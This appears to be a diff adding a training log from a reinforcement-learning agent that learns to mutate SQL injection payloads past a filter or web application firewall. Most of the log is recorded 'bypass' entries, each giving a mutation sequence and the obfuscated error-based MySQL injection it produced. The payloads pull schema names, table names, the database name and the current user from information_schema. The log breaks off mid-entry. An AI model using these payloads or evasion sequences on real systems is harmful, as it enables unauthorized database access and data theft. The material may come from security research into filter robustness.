+           payload: 1'%0d%0aand%0d%0aEXP(~(SElecT%0d%0a*%0d%0afRom%0d%0a(SELEcT%0d%0a((sElect%0d%0aJSON_ARRAYAGG(schema_name)%0d%0aFROM%0d%0aInfOrmatION_SCHEmA.schemata))
+  Ep 6200 | SR=10% | Steps=14.9 | R=-31.69
+  [BYPASS] Ep 6203 | steps=6 | seq=agg_swap -> agg_swap -> case -> null_byte -> crlf -> hex_to_char
+           payload: 1'%0d%0aand%0d%0aEXP(~(SelECt%0d%0a*%0d%0aFrOm%0d%0a(sElEct%0d%0a((seLEcT%0d%0aJSON_ARRAYAGG(COncat(TAbLe_schema,CHAR(46),TAbLe_name))%0d%0afRom%0d%0a
+  [BYPASS] Ep 6209 | steps=5 | seq=paren_full -> case -> null_byte -> crlf -> agg_swap
+           payload: 1'%0d%0aANd%0d%0aEXP(~(sELECT%0d%0a*%0d%0afROM%0d%0a(SELEct%0d%0a((sELect%0d%0aJSON_ARRAYAGG(schema_name)%0d%0afrom%0d%0ainFOrMatION_ScHEMA.schemata))
+  Ep 6210 | SR=20% | Steps=13.1 | R=-26.89
+  [BYPASS] Ep 6218 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
+           payload: 1'%0d%0aAnD%0d%0aEXP(~(SeLeCT%0d%0a*%0d%0aFRom%0d%0a(sELECT%0d%0a((SeLect%0d%0aJSON_ARRAYAGG(coNCAt(taBLe_schema,CHAR(46),TABLe_name))%0d%0afrom%0d%0a
+  Ep 6220 | SR=10% | Steps=14.0 | R=-27.51
+  [BYPASS] Ep 6221 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
+           payload: 1'%0d%0aAnD%0d%0aEXP(~(seLect%0d%0a*%0d%0afRom%0d%0a(sELeCt%0d%0a((sELEcT%0d%0aJSON_ARRAYAGG(CONCAt(tABLe_schema,CHAR(46),tABle_name))%0d%0afrOM%0d%0a
+  Ep 6230 | SR=10% | Steps=14.0 | R=-29.41
+  Ep 6240 | SR=0% | Steps=15.0 | R=-33.70
+  Ep 6250 | SR=0% | Steps=15.0 | R=-35.52
+  [BYPASS] Ep 6253 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
+           payload: 1'%0d%0aAnD%0d%0aEXP(~(selecT%0d%0a*%0d%0afRom%0d%0a(sELECT%0d%0a((SeLEcT%0d%0aJSON_ARRAYAGG(coNCaT(TAbLe_schema,CHAR(46),taBLE_name))%0d%0aFROm%0d%0a
+  Ep 6260 | SR=10% | Steps=14.0 | R=-33.53
+  Ep 6270 | SR=0% | Steps=15.0 | R=-35.77
+  Ep 6280 | SR=0% | Steps=15.0 | R=-34.22
+  Ep 6290 | SR=0% | Steps=15.0 | R=-33.62
+  Ep 6300 | SR=0% | Steps=15.0 | R=-34.22
+  Ep 6310 | SR=0% | Steps=15.0 | R=-35.29
+  Ep 6320 | SR=0% | Steps=15.0 | R=-34.83
+  Ep 6330 | SR=0% | Steps=15.0 | R=-35.67
+  Ep 6340 | SR=0% | Steps=15.0 | R=-34.75
+  Ep 6350 | SR=0% | Steps=15.0 | R=-36.17
+  Ep 6360 | SR=0% | Steps=15.0 | R=-35.21
+  [BYPASS] Ep 6367 | steps=6 | seq=agg_swap -> case -> null_byte -> crlf -> case -> hex_to_char
+           payload: 1'%0d%0aand%0d%0aEXP(~(sEleCT%0d%0a*%0d%0aFRom%0d%0a(sEleCt%0d%0a((SELect%0d%0aJSON_ARRAYAGG(cOnCAt(TAblE_schema,CHAR(46),TABLE_name))%0d%0aFroM%0d%0a
+  Ep 6370 | SR=10% | Steps=14.1 | R=-31.90
+  Ep 6380 | SR=0% | Steps=15.0 | R=-34.94
+  Ep 6390 | SR=0% | Steps=15.0 | R=-33.34
+  [BYPASS] Ep 6396 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
+           payload: 1'%0d%0aand%0d%0aEXP(~(selEct%0d%0a*%0d%0afroM%0d%0a(sElECt%0d%0a((sELEct%0d%0aJSON_ARRAYAGG(COnCaT(TaBle_schema,CHAR(46),tAble_name))%0d%0aFROm%0d%0a
+  Ep 6400 | SR=10% | Steps=14.0 | R=-32.12
+  Ep 6410 | SR=0% | Steps=15.0 | R=-36.55
+  Ep 6420 | SR=0% | Steps=15.0 | R=-35.98
+  Ep 6430 | SR=0% | Steps=15.0 | R=-35.93
+  Ep 6440 | SR=0% | Steps=15.0 | R=-35.33
+  [BYPASS] Ep 6450 | steps=7 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char -> case -> func_sp_nbsp
+           payload: 1'%0d%0aAND%0d%0aEXP(~(sELeCt%0d%0a*%0d%0aFrom%0d%0a(SeLEct%0d%0a((seLecT%0d%0acoNCaT(CHAR(124),JSON_ARRAYAGG(tabLE_name),CHAR(124))%0d%0afrom%0d%0aiN
+  Ep 6450 | SR=10% | Steps=14.2 | R=-31.29
+  [BYPASS] Ep 6455 | steps=4 | seq=agg_swap -> case -> null_byte -> crlf
+           payload: 1'%0d%0aanD%0d%0aEXP(~(SElECt%0d%0a*%0d%0afRom%0d%0a(seLeCt%0d%0a((SElecT%0d%0aJSON_ARRAYAGG(schema_name)%0d%0aFrOm%0d%0aINforMAtIoN_SCheMa.schemata))
+  Ep 6460 | SR=10% | Steps=13.9 | R=-31.31
+  Ep 6470 | SR=0% | Steps=15.0 | R=-34.59
+  Ep 6480 | SR=0% | Steps=15.0 | R=-35.32
+  [BYPASS] Ep 6483 | steps=10 | seq=case -> null_byte -> crlf -> case -> case -> case -> case -> case -> case -> func_sp_nbsp
+           payload: 1'%0d%0aAnD%0d%0aEXP(~(sELEcT%0d%0a*%0d%0aFrOm%0d%0a(seleCt%0d%0a(DAtAbAsE%a0()))a));%00
+  Ep 6490 | SR=10% | Steps=14.5 | R=-33.01
+  [BYPASS] Ep 6494 | steps=4 | seq=agg_swap -> case -> null_byte -> crlf
+           payload: 1'%0d%0aaNd%0d%0aEXP(~(sELect%0d%0a*%0d%0aFRoM%0d%0a(SelECT%0d%0a((sELECt%0d%0aJSON_ARRAYAGG(schema_name)%0d%0afrom%0d%0ainformaTiON_ScHEmA.schemata))
+  Ep 6500 | SR=10% | Steps=13.9 | R=-31.36
+  Ep 6510 | SR=0% | Steps=15.0 | R=-32.42
+  [BYPASS] Ep 6511 | steps=4 | seq=agg_swap -> case -> null_byte -> crlf
+           payload: 1'%0d%0aand%0d%0aEXP(~(SeLeCt%0d%0a*%0d%0afrOM%0d%0a(SelECT%0d%0a((seleCt%0d%0aJSON_ARRAYAGG(schema_name)%0d%0aFrOM%0d%0aInForMATiON_SCheMa.schemata))
+  [BYPASS] Ep 6517 | steps=6 | seq=agg_swap -> case -> null_byte -> crlf -> case -> hex_to_char
+           payload: 1'%0d%0aAND%0d%0aEXP(~(sEleCt%0d%0a*%0d%0aFrOm%0d%0a(SElecT%0d%0a((SELECt%0d%0aJSON_ARRAYAGG(coNCAT(tABlE_schema,CHAR(46),TABle_name))%0d%0afrOm%0d%0a
+  Ep 6520 | SR=20% | Steps=13.0 | R=-27.40
+  Ep 6530 | SR=0% | Steps=15.0 | R=-35.08
+  Ep 6540 | SR=0% | Steps=15.0 | R=-32.95
+  Ep 6550 | SR=0% | Steps=15.0 | R=-35.61
+  [BYPASS] Ep 6553 | steps=4 | seq=agg_swap -> case -> null_byte -> crlf
+           payload: 1'%0d%0aAnD%0d%0aEXP(~(SElEct%0d%0a*%0d%0aFrOM%0d%0a(SelEct%0d%0a((seLECt%0d%0aJSON_ARRAYAGG(schema_name)%0d%0afrOM%0d%0aiNfoRMAtiON_sCHeMa.schemata))
+  [BYPASS] Ep 6554 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
+           payload: 1'%0d%0aAND%0d%0aEXP(~(sELECT%0d%0a*%0d%0aFROM%0d%0a(SelEct%0d%0a((SelECt%0d%0aJSON_ARRAYAGG(coNcat(tABle_schema,CHAR(46),taBlE_name))%0d%0afrom%0d%0a
+  [BYPASS] Ep 6555 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
+           payload: 1'%0d%0aAND%0d%0aEXP(~(sELECt%0d%0a*%0d%0afroM%0d%0a(selEcT%0d%0a((seLeCt%0d%0aJSON_ARRAYAGG(coNCaT(table_schema,CHAR(46),taBLE_name))%0d%0afRom%0d%0a
+  Ep 6560 | SR=30% | Steps=11.9 | R=-23.29
+  Ep 6570 | SR=0% | Steps=15.0 | R=-32.53
+  Ep 6580 | SR=0% | Steps=15.0 | R=-32.80
+  [BYPASS] Ep 6586 | steps=6 | seq=agg_swap -> case -> null_byte -> crlf -> case -> hex_to_char
+           payload: 1'%0d%0aAnD%0d%0aEXP(~(SelecT%0d%0a*%0d%0aFRoM%0d%0a(SeLeCT%0d%0a((sElECT%0d%0aJSON_ARRAYAGG(CoNCAt(TaBle_schema,CHAR(46),taBLe_name))%0d%0aFrOM%0d%0a
+  Ep 6590 | SR=10% | Steps=14.1 | R=-32.10
+  [BYPASS] Ep 6599 | steps=4 | seq=agg_swap -> case -> null_byte -> crlf
+           payload: 1'%0d%0aAnD%0d%0aEXP(~(sELECt%0d%0a*%0d%0afROM%0d%0a(SeLect%0d%0a((seleCt%0d%0aJSON_ARRAYAGG(schema_name)%0d%0aFRoM%0d%0ainfOrmaTIOn_schEMA.schemata))
+  [BYPASS] Ep 6600 | steps=7 | seq=agg_swap -> case -> null_byte -> crlf -> case -> case -> func_sp_nbsp
+           payload: 1'%0d%0aAND%0d%0aEXP(~(SElecT%0d%0a*%0d%0afrom%0d%0a(SelECT%0d%0a(user%a0()))a));%00
+  Ep 6600 | SR=20% | Steps=13.1 | R=-25.62
+  [BYPASS] Ep 6608 | steps=4 | seq=agg_swap -> case -> null_byte -> crlf
+           payload: 1'%0d%0aAND%0d%0aEXP(~(seLeCt%0d%0a*%0d%0aFroM%0d%0a(SElECt%0d%0a((SeleCt%0d%0aJSON_ARRAYAGG(schema_name)%0d%0aFRoM%0d%0ainFORmATIon_schEmA.schemata))
+  Ep 6610 | SR=10% | Steps=13.9 | R=-29.64
+  Ep 6620 | SR=0% | Steps=15.0 | R=-32.13
+  [BYPASS] Ep 6629 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
+           payload: 1'%0d%0aand%0d%0aEXP(~(selECt%0d%0a*%0d%0aFrOm%0d%0a(SeLect%0d%0a((selECT%0d%0aJSON_ARRAYAGG(coNCAT(tablE_schema,CHAR(46),tABle_name))%0d%0afROM%0d%0a
+  Ep 6630 | SR=10% | Steps=14.0 | R=-31.09
+  [BYPASS] Ep 6638 | steps=4 | seq=agg_swap -> case -> null_byte -> crlf
+           payload: 1'%0d%0aaNd%0d%0aEXP(~(seleCt%0d%0a*%0d%0afroM%0d%0a(SeLEct%0d%0a((SelECt%0d%0aJSON_ARRAYAGG(schema_name)%0d%0afRoM%0d%0aINfOrMATiON_sCHeMA.schemata))
+  Ep 6640 | SR=10% | Steps=13.9 | R=-31.37
+  [BYPASS] Ep 6647 | steps=4 | seq=agg_swap -> case -> null_byte -> crlf
+           payload: 1'%0d%0aANd%0d%0aEXP(~(SelEct%0d%0a*%0d%0aFrOM%0d%0a(SeleCt%0d%0a((SeLecT%0d%0aJSON_ARRAYAGG(schema_name)%0d%0afROM%0d%0aInFORmAtION_SCHEMa.schemata))
+  Ep 6650 | SR=10% | Steps=13.9 | R=-29.64
+  [BYPASS] Ep 6655 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
+           payload: 1'%0d%0aaND%0d%0aEXP(~(SeleCt%0d%0a*%0d%0afRoM%0d%0a(sELEct%0d%0a((sElect%0d%0aJSON_ARRAYAGG(cOncAt(tabLE_schema,CHAR(46),tABle_name))%0d%0afrOm%0d%0a
+  [BYPASS] Ep 6660 | steps=7 | seq=agg_swap -> func_sp_nbsp -> agg_swap -> case -> null_byte -> crlf -> hex_to_char
+           payload: 1'%0d%0aand%0d%0aEXP(~(seLEct%0d%0a*%0d%0afROM%0d%0a(seLeCt%0d%0a((SeleCT%0d%0aconCaT(CHAR(124),JSON_ARRAYAGG(TablE_name),CHAR(124))%0d%0afrOM%0d%0ain
+  Ep 6660 | SR=20% | Steps=13.2 | R=-25.99
+  [BYPASS] Ep 6668 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
+           payload: 1'%0d%0aAND%0d%0aEXP(~(seLECt%0d%0a*%0d%0aFrom%0d%0a(sELEct%0d%0a((SElECT%0d%0aJSON_ARRAYAGG(concAt(TABlE_schema,CHAR(46),tABlE_name))%0d%0afROm%0d%0a
+  Ep 6670 | SR=10% | Steps=14.0 | R=-31.34
+  Ep 6680 | SR=0% | Steps=15.0 | R=-34.10
+  Ep 6690 | SR=0% | Steps=15.0 | R=-35.00
+  [BYPASS] Ep 6698 | steps=7 | seq=agg_swap -> case -> null_byte -> crlf -> case -> case -> hex_to_char
+           payload: 1'%0d%0aaND%0d%0aEXP(~(SelEct%0d%0a*%0d%0afrom%0d%0a(SeLECt%0d%0a((SeLECT%0d%0aJSON_ARRAYAGG(cOnCAT(TABLe_schema,CHAR(46),taBlE_name))%0d%0afROm%0d%0a
+  Ep 6700 | SR=10% | Steps=14.2 | R=-27.49
+  Ep 6710 | SR=0% | Steps=15.0 | R=-33.14
+  Ep 6720 | SR=0% | Steps=15.0 | R=-32.00
+  Ep 6730 | SR=0% | Steps=15.0 | R=-31.57
+  Ep 6740 | SR=0% | Steps=15.0 | R=-33.19
+  [BYPASS] Ep 6743 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
+           payload: 1'%0d%0aANd%0d%0aEXP(~(sELeCt%0d%0a*%0d%0aFRoM%0d%0a(sEleCt%0d%0a((sEleCt%0d%0aJSON_ARRAYAGG(coNCAT(TaBLe_schema,CHAR(46),TabLe_name))%0d%0aFRoM%0d%0a
+  [BYPASS] Ep 6750 | steps=9 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char -> case -> case -> case -> func_sp_nbsp
+           payload: 1'%0d%0aAnd%0d%0aEXP(~(SELeCT%0d%0a*%0d%0aFRom%0d%0a(SeLECt%0d%0a((SeLeCt%0d%0aCOncAT(CHAR(124),JSON_ARRAYAGG(table_name),CHAR(124))%0d%0afrOm%0d%0aIn
+  Ep 6750 | SR=20% | Steps=13.4 | R=-25.31
+  Ep 6760 | SR=0% | Steps=15.0 | R=-35.70
+  Ep 6770 | SR=0% | Steps=15.0 | R=-34.70
+  Ep 6780 | SR=0% | Steps=15.0 | R=-34.82
+  [BYPASS] Ep 6781 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
+           payload: 1'%0d%0aAnd%0d%0aEXP(~(selEct%0d%0a*%0d%0afroM%0d%0a(seLect%0d%0a((SELect%0d%0aJSON_ARRAYAGG(COncAT(tAbLe_schema,CHAR(46),tABlE_name))%0d%0afrOm%0d%0a
+  [BYPASS] Ep 6787 | steps=6 | seq=agg_swap -> case -> null_byte -> crlf -> case -> hex_to_char
+           payload: 1'%0d%0aANd%0d%0aEXP(~(SeleCt%0d%0a*%0d%0aFRom%0d%0a(sElect%0d%0a((SELEct%0d%0aJSON_ARRAYAGG(coNcat(TaBLe_schema,CHAR(46),TABLe_name))%0d%0afrom%0d%0a
+  Ep 6790 | SR=20% | Steps=13.1 | R=-27.49
+  Ep 6800 | SR=0% | Steps=15.0 | R=-33.86
+  [BYPASS] Ep 6808 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
+           payload: 1'%0d%0aAND%0d%0aEXP(~(SElEct%0d%0a*%0d%0afrOm%0d%0a(seLect%0d%0a((seLecT%0d%0aJSON_ARRAYAGG(cONCAt(tABle_schema,CHAR(46),tAblE_name))%0d%0aFroM%0d%0a
+  Ep 6810 | SR=10% | Steps=14.0 | R=-25.75
+  Ep 6820 | SR=0% | Steps=15.0 | R=-35.01
+  Ep 6830 | SR=0% | Steps=15.0 | R=-34.07
+  [BYPASS] Ep 6837 | steps=4 | seq=agg_swap -> case -> null_byte -> crlf
+           payload: 1'%0d%0aAnD%0d%0aEXP(~(SelECT%0d%0a*%0d%0aFrOM%0d%0a(seLect%0d%0a((SELecT%0d%0aJSON_ARRAYAGG(schema_name)%0d%0afRoM%0d%0ainfoRMAtIoN_SCheMA.schemata))
+  Ep 6840 | SR=10% | Steps=13.9 | R=-29.78
+  Ep 6850 | SR=0% | Steps=15.0 | R=-34.70
+  [BYPASS] Ep 6858 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
+           payload: 1'%0d%0aAND%0d%0aEXP(~(seLect%0d%0a*%0d%0afROm%0d%0a(selECt%0d%0a((SeLEct%0d%0aJSON_ARRAYAGG(cOncAt(TABLE_schema,CHAR(46),TaBlE_name))%0d%0aFRom%0d%0a
+  Ep 6860 | SR=10% | Steps=14.0 | R=-28.99
+  [BYPASS] Ep 6869 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
+           payload: 1'%0d%0aAnD%0d%0aEXP(~(sELeCT%0d%0a*%0d%0afROM%0d%0a(SEleCt%0d%0a((seLEcT%0d%0aJSON_ARRAYAGG(concAT(tABlE_schema,CHAR(46),TAbLE_name))%0d%0aFRom%0d%0a
+  [BYPASS] Ep 6870 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
+           payload: 1'%0d%0aand%0d%0aEXP(~(seleCt%0d%0a*%0d%0aFROM%0d%0a(sELECT%0d%0a((SElecT%0d%0aJSON_ARRAYAGG(concAT(tAble_schema,CHAR(46),TAbLe_name))%0d%0aFrom%0d%0a
+  Ep 6870 | SR=20% | Steps=13.0 | R=-27.44
+  Ep 6880 | SR=0% | Steps=15.0 | R=-33.07
+  Ep 6890 | SR=0% | Steps=15.0 | R=-35.85
+  [BYPASS] Ep 6896 | steps=6 | seq=agg_swap -> case -> null_byte -> crlf -> case -> hex_to_char
+           payload: 1'%0d%0aaND%0d%0aEXP(~(SELEcT%0d%0a*%0d%0aFrOM%0d%0a(seLecT%0d%0a((SELect%0d%0aJSON_ARRAYAGG(ConCaT(TABLe_schema,CHAR(46),TAble_name))%0d%0afroM%0d%0a
+  Ep 6900 | SR=10% | Steps=14.1 | R=-30.20
+  [BYPASS] Ep 6907 | steps=4 | seq=agg_swap -> case -> null_byte -> crlf
+           payload: 1'%0d%0aAnD%0d%0aEXP(~(SElECT%0d%0a*%0d%0aFroM%0d%0a(SElECT%0d%0a((SeLEcT%0d%0aJSON_ARRAYAGG(schema_name)%0d%0afROm%0d%0aInfORmatIOn_sCheMA.schemata))
+  Ep 6910 | SR=10% | Steps=13.9 | R=-29.27
+  Ep 6920 | SR=0% | Steps=15.0 | R=-34.90
+  Ep 6930 | SR=0% | Steps=15.0 | R=-34.93
+  [BYPASS] Ep 6940 | steps=6 | seq=agg_swap -> case -> null_byte -> crlf -> case -> hex_to_char
+           payload: 1'%0d%0aAnd%0d%0aEXP(~(SeLeCt%0d%0a*%0d%0afROM%0d%0a(SeLecT%0d%0a((SELecT%0d%0aJSON_ARRAYAGG(Concat(TABLe_schema,CHAR(46),TaBLE_name))%0d%0afROm%0d%0a
+  Ep 6940 | SR=10% | Steps=14.1 | R=-29.61
+  Ep 6950 | SR=0% | Steps=15.0 | R=-33.93
+  Ep 6960 | SR=0% | Steps=15.0 | R=-36.08
+  [BYPASS] Ep 6969 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
+           payload: 1'%0d%0aaNd%0d%0aEXP(~(SELeCT%0d%0a*%0d%0aFROM%0d%0a(sElECT%0d%0a((sElect%0d%0aJSON_ARRAYAGG(conCAt(tabLE_schema,CHAR(46),TaBLE_name))%0d%0afrom%0d%0a
+  Ep 6970 | SR=10% | Steps=14.0 | R=-29.70
+  Ep 6980 | SR=0% | Steps=15.0 | R=-34.55
+  Ep 6990 | SR=0% | Steps=15.0 | R=-34.43
+  [BYPASS] Ep 6994 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
+           payload: 1'%0d%0aanD%0d%0aEXP(~(SELecT%0d%0a*%0d%0afROm%0d%0a(seleCT%0d%0a((sEleCT%0d%0aJSON_ARRAYAGG(cONcAt(TabLE_schema,CHAR(46),tAbLe_name))%0d%0afRom%0d%0a
+  [BYPASS] Ep 6998 | steps=4 | seq=agg_swap -> case -> null_byte -> crlf
+           payload: 1'%0d%0aAnD%0d%0aEXP(~(sELEcT%0d%0a*%0d%0aFrOm%0d%0a(sELect%0d%0a((selecT%0d%0aJSON_ARRAYAGG(schema_name)%0d%0aFroM%0d%0aiNfORmaTIOn_scHeMa.schemata))
+  Ep 7000 | SR=20% | Steps=12.9 | R=-25.09
+  [BYPASS] Ep 7001 | steps=4 | seq=agg_swap -> case -> null_byte -> crlf
+           payload: 1'%0d%0aaND%0d%0aEXP(~(seLecT%0d%0a*%0d%0afROm%0d%0a(SElECT%0d%0a((selecT%0d%0aJSON_ARRAYAGG(schema_name)%0d%0aFRoM%0d%0aiNfoRMATiON_sCheMa.schemata))
+  [BYPASS] Ep 7008 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
+           payload: 1'%0d%0aaND%0d%0aEXP(~(SELEct%0d%0a*%0d%0afRom%0d%0a(SELect%0d%0a((SELecT%0d%0aJSON_ARRAYAGG(cOncAt(TabLe_schema,CHAR(46),TabLE_name))%0d%0aFrOm%0d%0a
+  Ep 7010 | SR=20% | Steps=12.9 | R=-25.77
+  [BYPASS] Ep 7012 | steps=4 | seq=agg_swap -> case -> null_byte -> crlf
+           payload: 1'%0d%0aAnd%0d%0aEXP(~(SeLECT%0d%0a*%0d%0afROM%0d%0a(sEleCt%0d%0a((SEleCt%0d%0aJSON_ARRAYAGG(schema_name)%0d%0afRoM%0d%0aINfoRmation_SCHema.schemata))
+  [BYPASS] Ep 7020 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
+           payload: 1'%0d%0aANd%0d%0aEXP(~(sEleCt%0d%0a*%0d%0afroM%0d%0a(SElect%0d%0a((selecT%0d%0aJSON_ARRAYAGG(cONCaT(TAbLe_schema,CHAR(46),TAble_name))%0d%0afRoM%0d%0a
+  Ep 7020 | SR=20% | Steps=12.9 | R=-27.32
+  Ep 7030 | SR=0% | Steps=15.0 | R=-34.23
+  Ep 7040 | SR=0% | Steps=15.0 | R=-31.82
+  [BYPASS] Ep 7042 | steps=4 | seq=agg_swap -> case -> null_byte -> crlf
+           payload: 1'%0d%0aanD%0d%0aEXP(~(sElEct%0d%0a*%0d%0afRom%0d%0a(SELECt%0d%0a((selecT%0d%0aJSON_ARRAYAGG(schema_name)%0d%0afRom%0d%0aiNFoRMATiOn_SCHEMA.schemata))
+  Ep 7050 | SR=10% | Steps=13.9 | R=-30.63
+  Ep 7060 | SR=0% | Steps=15.0 | R=-33.97
+  [BYPASS] Ep 7070 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
+           payload: 1'%0d%0aANd%0d%0aEXP(~(sElect%0d%0a*%0d%0aFRom%0d%0a(SElect%0d%0a((SeLect%0d%0aJSON_ARRAYAGG(coNCaT(TAblE_schema,CHAR(46),table_name))%0d%0afrOm%0d%0a
+  Ep 7070 | SR=10% | Steps=14.0 | R=-29.42
+  [BYPASS] Ep 7080 | steps=4 | seq=agg_swap -> case -> null_byte -> crlf
+           payload: 1'%0d%0aAND%0d%0aEXP(~(sELEct%0d%0a*%0d%0afRom%0d%0a(SEleCT%0d%0a((sELeCt%0d%0aJSON_ARRAYAGG(schema_name)%0d%0aFrom%0d%0aINFormATION_sCHEmA.schemata))
+  Ep 7080 | SR=10% | Steps=13.9 | R=-25.41
+  [BYPASS] Ep 7082 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
+           payload: 1'%0d%0aaND%0d%0aEXP(~(seLEcT%0d%0a*%0d%0afroM%0d%0a(SeLEct%0d%0a((SEleCt%0d%0aJSON_ARRAYAGG(COncAT(TabLE_schema,CHAR(46),taBle_name))%0d%0aFrom%0d%0a
+  [BYPASS] Ep 7086 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
+           payload: 1'%0d%0aAnD%0d%0aEXP(~(SeLect%0d%0a*%0d%0afrOM%0d%0a(SeleCT%0d%0a((sElecT%0d%0aJSON_ARRAYAGG(CoNCAt(TABLE_schema,CHAR(46),TAbLE_name))%0d%0afrOM%0d%0a
+  Ep 7090 | SR=20% | Steps=13.0 | R=-25.08
+  Ep 7100 | SR=0% | Steps=15.0 | R=-36.24
+  Ep 7110 | SR=0% | Steps=15.0 | R=-34.17
+  [BYPASS] Ep 7113 | steps=4 | seq=agg_swap -> case -> null_byte -> crlf
+           payload: 1'%0d%0aAnd%0d%0aEXP(~(sElECT%0d%0a*%0d%0afROm%0d%0a(seLECT%0d%0a((selecT%0d%0aJSON_ARRAYAGG(schema_name)%0d%0aFRoM%0d%0aINFORmatION_SCheMA.schemata))
+  [BYPASS] Ep 7115 | steps=4 | seq=agg_swap -> case -> null_byte -> crlf
+           payload: 1'%0d%0aAnD%0d%0aEXP(~(sEleCT%0d%0a*%0d%0aFrOM%0d%0a(SelEct%0d%0a((sElEct%0d%0aJSON_ARRAYAGG(schema_name)%0d%0afrOm%0d%0ainFormAtiON_sChemA.schemata))
+  Ep 7120 | SR=20% | Steps=12.8 | R=-27.22
+  Ep 7130 | SR=0% | Steps=15.0 | R=-30.52
+  [BYPASS] Ep 7132 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
+           payload: 1'%0d%0aanD%0d%0aEXP(~(SEleCT%0d%0a*%0d%0aFROM%0d%0a(SeLECt%0d%0a((sElect%0d%0aJSON_ARRAYAGG(COncat(taBle_schema,CHAR(46),taBLE_name))%0d%0afrom%0d%0a
+  Ep 7140 | SR=10% | Steps=14.0 | R=-31.08
+  [BYPASS] Ep 7148 | steps=6 | seq=agg_swap -> case -> null_byte -> crlf -> case -> hex_to_char
+           payload: 1'%0d%0aaND%0d%0aEXP(~(SeLeCT%0d%0a*%0d%0aFrOM%0d%0a(SeLECt%0d%0a((SELeCt%0d%0aJSON_ARRAYAGG(cONCat(tabLe_schema,CHAR(46),TaBLe_name))%0d%0afROm%0d%0a
+  Ep 7150 | SR=10% | Steps=14.1 | R=-31.37
+  [BYPASS] Ep 7155 | steps=4 | seq=agg_swap -> case -> null_byte -> crlf
+           payload: 1'%0d%0aand%0d%0aEXP(~(SelEcT%0d%0a*%0d%0afroM%0d%0a(SelECt%0d%0a((sELect%0d%0aJSON_ARRAYAGG(schema_name)%0d%0afRom%0d%0aiNfOrmAtioN_SCHeMa.schemata))
+  Ep 7160 | SR=10% | Steps=13.9 | R=-30.69
+  [BYPASS] Ep 7163 | steps=4 | seq=agg_swap -> case -> null_byte -> crlf
+           payload: 1'%0d%0aand%0d%0aEXP(~(SElect%0d%0a*%0d%0afrOm%0d%0a(seLEct%0d%0a((seleCt%0d%0aJSON_ARRAYAGG(schema_name)%0d%0afrOm%0d%0aINforMaTION_SchEma.schemata))
+  Ep 7170 | SR=10% | Steps=13.9 | R=-31.73
+  [BYPASS] Ep 7176 | steps=5 | seq=agg_swap -> agg_swap -> case -> null_byte -> crlf
+           payload: 1'%0d%0aaND%0d%0aEXP(~(selECT%0d%0a*%0d%0afrOm%0d%0a(sELECT%0d%0a((selECt%0d%0aJSON_ARRAYAGG(schema_name)%0d%0afRom%0d%0aInfOrmaTioN_scHEMA.schemata))
+  Ep 7180 | SR=10% | Steps=14.0 | R=-28.81
+  Ep 7190 | SR=0% | Steps=15.0 | R=-35.42
+  Ep 7200 | SR=0% | Steps=15.0 | R=-34.47
+  Ep 7210 | SR=0% | Steps=15.0 | R=-35.19
+  Ep 7220 | SR=0% | Steps=15.0 | R=-36.02
+  Ep 7230 | SR=0% | Steps=15.0 | R=-33.81
+  Ep 7240 | SR=0% | Steps=15.0 | R=-33.44
+  Ep 7250 | SR=0% | Steps=15.0 | R=-34.62
+  [BYPASS] Ep 7259 | steps=4 | seq=agg_swap -> case -> null_byte -> crlf
+           payload: 1'%0d%0aand%0d%0aEXP(~(selecT%0d%0a*%0d%0aFROm%0d%0a(SELECt%0d%0a((seLECT%0d%0aJSON_ARRAYAGG(schema_name)%0d%0afROM%0d%0aiNFORmATION_Schema.schemata))
+  Ep 7260 | SR=10% | Steps=13.9 | R=-31.73
+  Ep 7270 | SR=0% | Steps=15.0 | R=-36.09
+  [BYPASS] Ep 7277 | steps=4 | seq=agg_swap -> case -> null_byte -> crlf
+           payload: 1'%0d%0aand%0d%0aEXP(~(sELEct%0d%0a*%0d%0aFrOm%0d%0a(SELEct%0d%0a((SEleCT%0d%0aJSON_ARRAYAGG(schema_name)%0d%0afrom%0d%0aINfOrmAtIOn_ScheMa.schemata))
+  Ep 7280 | SR=10% | Steps=13.9 | R=-30.50
+  Ep 7290 | SR=0% | Steps=15.0 | R=-32.97
+  Ep 7300 | SR=0% | Steps=15.0 | R=-34.02
+  [BYPASS] Ep 7302 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
+           payload: 1'%0d%0aAnd%0d%0aEXP(~(selEcT%0d%0a*%0d%0afROM%0d%0a(sElect%0d%0a((selECt%0d%0aJSON_ARRAYAGG(COnCat(TablE_schema,CHAR(46),TablE_name))%0d%0afrOm%0d%0a
+  Ep 7310 | SR=10% | Steps=14.0 | R=-28.57
+  [BYPASS] Ep 7315 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
